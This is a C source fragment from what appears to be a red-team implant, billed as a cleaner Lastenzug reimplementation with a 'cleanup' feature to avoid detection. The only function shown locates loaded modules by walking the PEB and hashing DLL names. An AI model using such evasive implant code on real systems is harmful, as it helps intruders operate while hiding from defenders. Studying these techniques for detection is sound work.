/*!
 *
 * A reimplementation of the Lastenzug code from
 * codewhitesec / f-link. Makes it much cleaner,
 * easier to read, and adds a 'cleanup' feature
 * to avoid detection.
 *
 * Furthermore, does not limit the number of the
 * clients that can be used, and permits a number
 * of connections that can be sent over at a given
 * time.
 *
 * @codewhitesec
 * @flink
 * @secidiot
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Locates a module already loaded in memory.
 *
!*/
D_SEC( B ) PVOID PebGetModule( _In_ UINT32 ModuleHash )
{
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	/* Get a pointer to the list */
	Hdr = & NtCurrentPeb()->Ldr->InLoadOrderModuleList;
	Ent = Hdr->Flink;

	/* Enumerate the linked list */
	for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
		Ldr = CONTAINING_RECORD( Ent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );

		/* Compare the DLL Name */
		if ( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == ModuleHash ) {
			/* Success! */
			return Ldr->DllBase;
		};
	};
	/* Abort! */
	return NULL;
};
